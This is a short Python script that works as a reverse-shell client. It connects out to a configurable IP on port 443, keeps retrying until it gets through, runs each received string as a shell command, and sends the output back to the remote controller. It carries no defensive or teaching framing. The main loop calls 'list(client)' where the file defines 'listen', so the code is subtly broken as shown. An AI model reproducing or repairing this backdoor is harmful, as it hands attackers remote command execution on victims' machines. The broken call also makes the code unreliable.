import os
import time
import socket
import subprocess

IP = ''
PORT = 443

def connect(ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((ip, port))
        return c
    except Exception as e:
        print(f'Connection Error: {e}')

def listen(c):
    try:
        while True:
            data = c.recv(1024).decode().strip()
            if data == '/exit':
                return
            else:
                cmd(c, data)
    except Exception as e:
        print(f'Listen function Error: {e}')


def cmd(c, data):
    try:
        if data.startswith('cd '):
            os.chdir(data[3:].strip())
            return
        
        p = subprocess.Popen(
            data,
            shell=True,
            stdin=subprocess.PIPE ,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE
        )
        c.send(
            p.stdout.read() + p.stderr.read() + b'\n'
        )
    except Exception as e:
        print(f'CMD Function Error: {e}')

if __name__ == '__main__':
    try:
        while True:
            client = connect(IP, PORT)
            if client:
                list(client)
            else:
                time.sleep(.5)
    except KeyboardInterrupt:
        print('Program Stopped by the User! ')
    except Exception as e:
        print(f'Main Connection {e}')